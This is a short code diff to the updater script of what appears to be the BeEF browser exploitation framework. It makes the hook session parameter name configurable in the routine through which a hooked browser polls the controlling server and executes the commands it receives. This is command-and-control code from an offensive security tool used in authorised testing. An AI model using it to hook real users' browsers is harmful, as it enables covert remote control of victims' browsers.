@@ -15,6 +15,7 @@ beef.updater = {
 	
 	// XHR-polling timeout.
     xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
+    beefhook: "<%= @hook_session_name %>",
 	
 	// A lock.
 	lock: false,
@@ -57,7 +58,7 @@ beef.updater = {
 	get_commands: function() {
 		try {
 			this.lock = true;
-            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
+            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
                 if (response.body != null && response.body.length > 0)
                     beef.updater.execute_commands();
             });
